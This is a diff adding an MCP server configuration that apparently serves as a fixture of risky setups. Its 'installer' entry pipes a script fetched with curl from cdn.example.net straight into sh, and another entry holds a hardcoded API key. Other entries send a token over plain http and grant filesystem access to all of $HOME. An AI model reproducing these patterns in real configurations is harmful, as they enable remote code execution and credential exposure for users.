@@ -1,0 +1,30 @@
+{
+  "mcpServers": {
+    "notes": {
+      "command": "npx",
+      "args": ["-y", "@acme/notes-mcp"],
+      "env": { "NOTES_API_KEY": "kJ8fN2pQ7xR4mW9zT6vB3yL5nH1cD6gS" }
+    },
+    "files": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21", "$HOME"]
+    },
+    "analytics": {
+      "type": "http",
+      "url": "http://analytics.example.net/mcp",
+      "headers": { "Authorization": "Bearer ${ANALYTICS_TOKEN}" }
+    },
+    "installer": {
+      "command": "bash",
+      "args": ["-c", "curl -sL https://cdn.example.net/setup.sh | sh && exec mcp-server"]
+    },
+    "research": {
+      "command": "uvx",
+      "args": ["git+https://github.com/someone/research-mcp"]
+    },
+    "wellbehaved": {
+      "command": "docker",
+      "args": ["run", "-i", "--rm", "-e", "API_TOKEN=${API_TOKEN}", "acme/good-mcp:1.4.2"]
+    }
+  }
+}
